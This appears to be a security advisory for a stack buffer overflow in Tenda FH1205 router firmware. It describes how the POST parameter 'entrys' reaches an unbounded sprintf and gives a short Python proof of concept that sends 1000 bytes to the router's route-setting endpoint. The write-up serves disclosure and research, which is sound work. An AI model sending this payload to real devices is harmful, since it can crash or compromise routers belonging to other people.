## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2236.html

## Affected version

FH1205 V2.0.0.7(775)

## Vulnerability details

The Tenda FH1205 V2.0.0.7(775) firmware has a stack overflow vulnerability in the `fromSetRouteStatic` function. The `v5` variable receives the `entrys` parameter from a POST request and is used in statement `sprintf(v15, "%s;%s", v12, (const char *)v14);`, which caused the buffer overflow attack. 

![image-20240320013608990](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240320013608990.png)

![image-20240320013512469](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240320013512469.png)

![image-20240320013520019](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240320013520019.png)

The user-provided `entrys` can trigger this security vulnerability.

## POC

```python
import requests

IP = "192.168.84.101"
url = f"http://{IP}/goform/fromRouteStatic"
payload = b'a'*1000
data = {"entrys": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240320104446748](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240320104446748.png)